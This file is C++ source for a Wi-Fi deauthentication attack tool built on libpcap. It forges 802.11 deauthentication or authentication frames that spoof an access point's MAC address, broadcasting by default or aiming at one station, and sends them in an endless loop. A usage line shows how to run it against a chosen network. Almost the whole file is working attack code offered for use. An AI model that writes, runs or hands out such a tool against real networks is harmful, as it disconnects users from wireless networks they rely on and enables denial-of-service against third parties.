#include "CDeauthAttack.h"


void CParam::usage() 
{
	printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]");
	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB");
}


bool CParam::parse(int argc, char* argv[])
{
	if (argc < 3) {
		usage();
		return false;
	}

	for(int i =1; i < argc; i++)
		params.push_back(argv[i]);
		

	return true;
}



CDeauthAttack::CDeauthAttack(CParam parameter) : param(parameter)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	std::string interface = param.params[0];
	pcap = pcap_open_live(interface.data(), 0, 0, 0, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interface.data(), errbuf);
        exit(1);
	}

}

CDeauthAttack::~CDeauthAttack(){


    pcap_close(pcap);  
}


int CDeauthAttack::deauthAttack()
{
	type = getType();
	makePacket();
	
	while(1)
		sendPacket();

}

void CDeauthAttack::makePacket()
{
	
	


	switch(type)
	{
		case TYPE::AUTHENTICATION:
			packet = new char[sizeof(ST_AUTH_WIRELESS_PACKET)];
			makeAuth();
			break;
		case TYPE::DEAUTHENTICATION:
			packet = new char[sizeof(ST_DEAUTH_WIRELESS_PACKET)];
			makeDeauth();
			break;		
	}

	// if(type == TYPE::AUTHENTICATION)
	// {
	// 	packet = new char[sizeof(ST_AUTH_WIRELESS_PACKET)];
	// 	makeAuth();
	// }

	// if(type == TYPE::DEAUTHENTICATION)
	// {
	// 	packet = new char[sizeof(ST_DEAUTH_WIRELESS_PACKET)];
	// 	makeDeauth();
	// }

}

void CDeauthAttack::makeDeauth()
{
	ST_DEAUTH_WIRELESS_PACKET* wirelessPacket = (ST_DEAUTH_WIRELESS_PACKET*)packet;

	wirelessPacket->radioTapHeader.revision = 0x00;
	wirelessPacket->radioTapHeader.pad = 0x00;
	wirelessPacket->radioTapHeader.length = 0x000C;
	wirelessPacket->radioTapHeader.present[0] = 0x04 ;
	wirelessPacket->radioTapHeader.present[1] = 0x80;
	wirelessPacket->radioTapHeader.present[2] = 0x00;
	wirelessPacket->radioTapHeader.present[3] = 0x00;
	wirelessPacket->radioTapHeader.dataRate = 0x02;
	wirelessPacket->radioTapHeader.txFlags = 0x0000;

	wirelessPacket->authentication.frameControlField = (0x00<<8) + (type);
	wirelessPacket->authentication.duration = 0x0000;
	wirelessPacket->authentication.dstMac = getDstMac();
	wirelessPacket->authentication.srcMac = Mac(param.params[1]);
	wirelessPacket->authentication.bssidMac = Mac(param.params[1]);
	wirelessPacket->authentication.fragmentSeqNum = 0x00 + (0x9fe << 4);

	wirelessPacket->fixedParameter.reasonCode = 0x0007;

}

void CDeauthAttack::makeAuth()
{
	ST_AUTH_WIRELESS_PACKET* wirelessPacket = (ST_AUTH_WIRELESS_PACKET*)packet;

	wirelessPacket->radioTapHeader.revision = 0x00;
	wirelessPacket->radioTapHeader.pad = 0x00;
	wirelessPacket->radioTapHeader.length = 0x000C;
	wirelessPacket->radioTapHeader.present[0] = 0x04 ;
	wirelessPacket->radioTapHeader.present[1] = 0x80;
	wirelessPacket->radioTapHeader.present[2] = 0x00;
	wirelessPacket->radioTapHeader.present[3] = 0x00;
	wirelessPacket->radioTapHeader.dataRate = 0x02;
	wirelessPacket->radioTapHeader.txFlags = 0x0000;

	wirelessPacket->authentication.frameControlField = (0x00<<8) + (type);
	wirelessPacket->authentication.duration = 0x0000;
	wirelessPacket->authentication.dstMac = getDstMac();
	wirelessPacket->authentication.srcMac = Mac(param.params[1]);
	wirelessPacket->authentication.bssidMac = Mac(param.params[1]);
	wirelessPacket->authentication.fragmentSeqNum = 0x00 + (0x9fe << 4);

	wirelessPacket->fixedParameter.authenticationAlgorithm = 0x0000;
	wirelessPacket->fixedParameter.authenticationSeq = 0x0200;
	wirelessPacket->fixedParameter.statusCode = 0x0000;


}

u_int8_t CDeauthAttack::getType()
{

	u_int8_t type = TYPE::DEAUTHENTICATION;

	for(int i = 2; i < param.params.size(); i++)
	{
		if(param.params[i] == "-auth")
			type = TYPE::AUTHENTICATION;
	}

	return type;

}

Mac CDeauthAttack::getDstMac()
{
	Mac dstMac("FF:FF:FF:FF:FF:FF");

	for(int i = 2; i < param.params.size(); i++)
	{
		if(param.params[i] == "-auth")
			continue;
		dstMac = Mac(param.params[i]);
	}

	return dstMac;

}


void CDeauthAttack::sendPacket()
{
	int size;
	switch(type)
	{
		case TYPE::AUTHENTICATION:
			size = sizeof(ST_AUTH_WIRELESS_PACKET);
			break;
		case TYPE::DEAUTHENTICATION:
			size = sizeof(ST_DEAUTH_WIRELESS_PACKET);
			break;
	}

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(packet), size);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}

	sleep(0.0005);
}    
